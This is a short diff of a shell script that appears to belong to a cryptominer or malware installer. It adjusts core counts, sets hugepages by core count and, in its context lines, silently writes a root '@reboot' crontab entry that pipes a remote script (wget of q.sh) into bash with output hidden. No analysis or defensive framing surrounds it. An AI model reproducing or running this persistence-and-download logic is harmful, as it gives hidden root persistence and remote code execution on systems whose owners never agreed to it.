@@ -23,6 +23,10 @@ if [ "$mode" == "1" ]; then
   [ "$cores" == "4" ] && cores="1";
 fi
 
+if [ "$mode" == "0" ]; then
+  [ "$cores" == "8" ] && cores="2";
+fi
+
 sudo sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*1024)) >/dev/null 2>&1
 sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
 
